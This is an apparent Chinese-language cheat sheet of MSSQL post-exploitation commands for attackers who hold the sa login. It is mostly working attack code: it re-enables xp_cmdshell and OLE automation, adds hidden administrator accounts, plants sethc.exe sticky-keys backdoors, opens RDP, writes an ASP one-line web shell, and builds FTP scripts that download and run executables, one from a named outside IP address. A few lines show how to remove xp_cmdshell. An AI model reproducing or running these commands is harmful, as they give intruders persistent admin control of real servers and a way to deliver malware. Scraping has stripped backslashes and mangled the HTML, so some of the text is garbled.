1996&#x2F;08&#x2F;30 20:13<br />@functname nvarchar(517),&#x2F;* (owner.)name of function to call <em>&#x2F; @dllname varchar(255)&#x2F;</em> name of DLL containing function <em>&#x2F; as<br />set implicit_transactions off<br />if @@trancount &gt; 0&amp;#160; <br />begin<br />raiserror(15002,-1,-1,’sp_addextendedproc’)&amp;#160; <br />return (1)&amp;#160; <br />end<br />dbcc addextendedproc( @functname, @dllname)&amp;#160; <br />return (0) – sp_addextendedproc<br />GO<br />第二：<br />use master&amp;#160; <br />exec sp_addextendedproc xp_cmdshell,’xp_cmdshell.dll’&amp;#160; <br />exec sp_addextendedproc xp_dirtree,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_enumgroups,’xplog70.dll’&amp;#160; <br />exec sp_addextendedproc xp_fixeddrives,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_loginconfig,’xplog70.dll’&amp;#160; <br />exec sp_addextendedproc xp_enumerrorlogs,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_getfiledetails,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc sp_OACreate,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OADestroy,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAGetErrorInfo,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAGetProperty,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAMethod,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OASetProperty,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc sp_OAStop,’odsole70.dll’&amp;#160; <br />exec sp_addextendedproc xp_regaddmultistring,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regdeletekey,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regdeletevalue,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regenumvalues,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regread,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regremovemultistring,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_regwrite,’xpstar.dll’&amp;#160; <br />exec sp_addextendedproc xp_availablemedia,’xpstar.dll’<br /><br /><br />————————————————————————————–<br />一.更改sa口令方法：<br />用sql综合利用工具连接后，执行命令：<br />exec sp_password NULL,’新密码’,’sa’<br />(提示：慎用!)<br /><br />二.简单修补sa弱口令.<br />方法1:查询分离器连接后执行：<br />if exists (select * from<br />dbo.sysobjects where id &#x3D; object_id(N’[dbo].[xp_cmdshell]’) and<br />OBJECTPROPERTY(id, N’IsExtendedProc’) &#x3D; 1)<br />exec sp_dropextendedproc N’[dbo].[xp_cmdshell]’<br />GO<br />然后按F5键命令执行完毕<br /><br />方法2:查询分离器连接后<br />第一步执行：use master<br />第二步执行：sp_dropextendedproc ‘xp_cmdshell’<br />然后按F5键命令执行完毕<br /><br />无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br />恢复方法：查询分离器连接后,<br />第一步执行：sp_dropextendedproc &quot;xp_cmdshell&quot;<br />第二步执行：sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’<br /><br />无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br />恢复方法：查询分离器连接后,<br />第一步执行:exec sp_dropextendedproc ‘xp_cmdshell’<br />第二步执行:exec sp_addextendedproc ‘xp_cmdshell’,’xpweb70.dll’&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; <br />然后按F5键命令执行完毕<br /><br />如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:<br />查询分离器连接后,<br />2000servser系统:<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:winntsystem32cmd.exe &#x2F;c net user Web hacker &#x2F;add’<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:winntsystem32cmd.exe &#x2F;c net localgroup administrators Web &#x2F;add’<br />xp或2003server系统: 126错误！命令<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:windowssystem32cmd.exe &#x2F;c net user Web$ hacker &#x2F;add’<br />declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:windowssystem32cmd.exe &#x2F;c net localgroup administrators Web$ &#x2F;add’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />找不到存储过程 sp_addextendedproc<br />解决方法:<br />create procedure sp_addextendedproc — 1996&#x2F;08&#x2F;30 20:13<br />@functname nvarchar(517),&#x2F;</em> (owner.)name of function to call <em>&#x2F;<br />@dllname varchar(255)&#x2F;</em> name of DLL containing function *&#x2F;<br />as<br />set implicit_transactions off<br />if @@trancount &gt; 0<br />begin<br />raiserror(15002,-1,-1,’sp_addextendedproc’)<br />return (1)<br />end<br />dbcc addextendedproc( @functname, @dllname)<br />return (0) – sp_addextendedproc<br />GO<br />这段代码贴入查询分离器,执行<br />查看目录<br />exec master.dbo.xp_subdirs ‘c:’<br />列出磁盘<br />e<br>xec master..xp_fixeddrives<br />xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！<br />EXEC master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SoftWareMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,0<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net user 123 123 &#x2F;add&quot;)’);<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net localgroup administrators 123 &#x2F;add&quot;)’);<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开3389：<br />exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–<br />关3389：<br />exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal Server’,’fDenyTSConnections’,’REG_DWORD’,1;<br />查看3389端口<br />exec xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp’,’PortNumber’<br />普通CMD后门<br />xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’,’debugger’,’reg_sz’,’c:windowssystem32cmd.exe’<br /><br />建立用户1-这里默认用户是Reconditeness密码9527可自行修改<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net1 user Reconditeness 9527 &#x2F;ad &amp;net localgroup administrators terks &#x2F;ad&quot;)’)<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c net1 user Reconditeness 9527 &#x2F;ad &amp;net localgroup administrators terks &#x2F;ad&quot;)’)<br /><br />win2K直接上PS马<br />exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:winntsystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)’)<br /><br />win03-XP直接上PS马<br />exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,1<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;cmd.exe &#x2F;c @echo open 60.190.176.85&gt;&gt;net.txt&amp;@echo reconditeness&gt;&gt;net.txt&amp;@echo 7259&gt;&gt;net.txt&amp;@echo get 0.exe&gt;&gt;net.txt&amp;@echo bye&gt;&gt;net.txt&amp;@ftp -s:net.txt&amp;del net.txt &amp; 0.exe&quot;)’)<br /><br />shift后门命令<br />declare @o int<br />exec sp_oacreate ‘scripting.filesystemobject’, @o out<br />exec sp_oamethod @o, ‘copyfile’,null,’c:windowsexplorer.exe’ ,’c:windowssystem32sethc.exe’;<br />declare @o int<br />exec sp_oacreate ‘scripting.filesystemobject’, @o out<br />exec sp_oamethod @o, ‘copyfile’,null,’c:windowssystem32sethc.exe’ ,’c:windowssystem32dllcachesethc.exe’;<br />copy c:windowsexplorer.exe c:windowssystem32sethc.exe<br />copy c:windowssystem32sethc.exe c:windowssystem32dllcachesethc.exe<br /><br />declare @o int<br />exec sp_oacreate ‘wscript.shell’, @o out<br />exec sp_oamethod @o, ‘run’, NULL, ‘XXXXX’ XXXXX为你要执行的命令<br /><br /><br />开3389<br />REG ADD HKLMSYSTEMCurrentControlSetControlTerminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br /><br />SQL写一句话<br />exec master.dbo.xp_subdirs ‘d:webcdlxkj’;<br />exec sp_makewebtask ‘d:webcdlxkjXX.asp’,’select’’&lt;%execute(request(&quot;SB&quot;))%&gt;’’ ‘<br />SA沙盒模式提权—–<br />———————-<br />exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,0;<br />——————————————————-<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net user sql$ 123 &#x2F;add&quot;)’);<br />——————————————————-<br />Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database&#x3D;c:windowssystem32iasias.mdb’,’select shell(&quot;net localgroup administrators sql$ &#x2F;add&quot;)’);<br /><br />SHIFT<br />入侵<br />EXEC master..xp_regwrite<br />@rootkey&#x3D;’HKEY_LOCAL_MACHINE’,<br />@key&#x3D;’SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.EXE’,<br />@value_name&#x3D;’Debugger’,<br />@type&#x3D;’REG_SZ’,<br />@value&#x3D;’C:WINDOWSexplorer.exe’<br />整个过程是利用master..xp_regwrite这组件来完成的,<br /><br />1.sql命令查询注册表粘滞键是否被劫持<br />exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’,’Debugger’<br />2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)<br />xp_regwrite ‘HKEY_LOCAL_MACHINE’, ‘SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’,<br />‘Debugger’,’REG_SZ’,’C:WINDOWSsystem32taskmgr.exe’<br />3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用<br />xp_regdeletekey ‘HKEY_LOCAL_MACHINE’, ‘SOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionssethc.exe’<br /><br />sql写文件<br />declare @o int, @f int, @t int, @ret int<br />exec sp_oacreate ‘scripting.filesystemobject’, @o out<br />exec sp_oamethod @o, ‘createtextfile’, @f out, ‘c:1.vbs’, 1<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’set wsnetwork&#x3D;CreateObject(&quot;WSCRIPT.NETWORK&quot;)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’os&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;&amp;wsnetwork.ComputerName’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set ob&#x3D;GetObject(os)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set oe&#x3D;GetObject(os&amp;&quot;&#x2F;Administrators,group&quot;)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set od&#x3D;ob.Create(&quot;user&quot;,&quot;test&quot;)’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’od.SetPassword &quot;1234&quot;’<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’od.SetInfo ‘<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’Set of&#x3D;GetObject(os&amp;&quot;&#x2F;test&quot;,user) ‘<br />exec @ret &#x3D; sp_oamethod @f, ‘writeline’, NULL,’oe.add os&amp;&quot;&#x2F;test&quot;’<br />exec master..xp_cmdshell ‘cscript c:1.vbs’<br /><br />无NET提权的脚本<br />struser&#x3D;wscript.arguments(0)<br />strpass&#x3D;wscript.arguments(1)<br />set lp&#x3D;createObject(&quot;WSCRIPT.NETWORK&quot;)<br />oz&#x3D;&quot;WinNT:&#x2F;&#x2F;&quot;&amp;lp.ComputerName<br />Set ob&#x3D;GetObject(oz)<br />Set oe&#x3D;GetObject(oz&amp;&quot;&#x2F;Administrators,group&quot;)<br />Set od&#x3D;ob.create(&quot;user&quot;,struser)<br />od.SetPassword strpass<br />od.SetInfo<br />Set of&#x3D;GetObject(oz&amp;&quot;&#x2F;&quot; &amp; struser &amp; &quot;,user&quot;)<br />oe.Add(of.ADsPath)<br />For Each admin in oe.Members<br />if struser&#x3D;admin.Name then<br />Wscript.echo struser &amp; &quot; 建立成功!&quot;<br />wscript.quit<br />end if<br />Next<br />Wscript.echo struser &amp; &quot; 用户建立失败!&quot;<br />将以上保存为user.VBS文件<br />然后执行：cscript user.vbs 用户名 密码<br /><br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复xp_cmdshell<br />exec sp_dropextendedproc ‘xp_cmdshell’<br />EXEC sp_addextendedproc xp_cmdshell,@dllname &#x3D;’xplog70.dll’declare @o int<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开启xp_cmdshell<br />USE master<br />EXEC sp_configure ‘show advanced options’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘xp_cmdshell’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘show advanced options’, 0<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开启Automation Procedures<br />USE master<br />EXEC sp_configure ‘show advanced options’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘Ole Automation Procedures’,1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configur<br>e ‘show advanced options’, 0<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />开启Distributed Queries<br />USE master<br />EXEC sp_configure ‘show advanced options’, 1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘Ad Hoc Distributed Queries’,1<br />RECONFIGURE WITH OVERRIDE<br />EXEC sp_configure ‘show advanced options’, 0<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复Xp_regwrite<br />EXEC sp_dropextendedproc ‘Xp_regwrite’<br />exec sp_addextendedproc xp_regwrite,’xpstar.dll’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />恢复sp_OACreate<br />dbcc addextendedproc (&quot;sp_OACreate&quot;,&quot;odsole70.dll&quot;)<br />exec sp_addextendedproc sp_OAMethod,’odsole70.dll’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />cmdshell开3389<br />exec master..xp_cmdshell ‘echo Windows Registry Editor Version 5.00&gt;c:3389.reg’<br />exec master..xp_cmdshell ‘echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server]&gt;&gt;c:3389.reg’<br />exec master..xp_cmdshell ‘echo &quot;fDenyTSConnections&quot;&#x3D;dword:00000000&gt;&gt;c:3389.reg’<br />exec master..xp_cmdshell ‘regedit &#x2F;s c:3389.reg’<br />exec master..xp_cmdshell ‘del c:3389.reg’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />cmdshell添加用户<br />insert resultcmd_cc exec master..xp_cmdshell ‘net user 用户 密码 &#x2F;add’<br />insert resultcmd_cc exec master..xp_cmdshell ‘net user 用户 密码’<br />insert resultcmd_cc exec master..xp_cmdshell ‘net user 用户 &#x2F;active:yes’<br />insert resultcmd_cc exec master..xp_cmdshell ‘net localgroup administrators 用户 &#x2F;add’<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />oacreate添加用户<br />DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br />EXEC sp_oamethod @s,[run], NULL, [net user support$ support &#x2F;add]<br />EXEC sp_oamethod @s,[run], NULL, [net localgroup administrators support &#x2F;add]<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />regwrite添加用户<br />Exec master.dbo.xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SOFTWAREMicrosoftJet4.0Engines’,’SandBoxMode’,’REG_DWORD’,0<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;iasdnary.mdb’,’select shell(&quot;net user 用户 密码 &#x2F;add&quot;)’)<br />select * from openrowset(‘microsoft.jet.oledb.4.0’,’;database&#x3D;iasdnary.mdb’,’select shell(&quot;net localgroup administrators 用户 &#x2F;add&quot;)’)<br />&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br />cmdshell模式FTP下载:<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo open FTP地址&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo 123 &gt;&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo 123 &gt;&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo get 1433.exe sly.exe&gt;&gt;sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c echo bye &gt;&gt;sly.sys]’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c ftp -s:sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c del sly.sys’<br />insert resultcmd_cc exec master..xp_cmdshell ‘cmd &#x2F;c sly.exe’<br 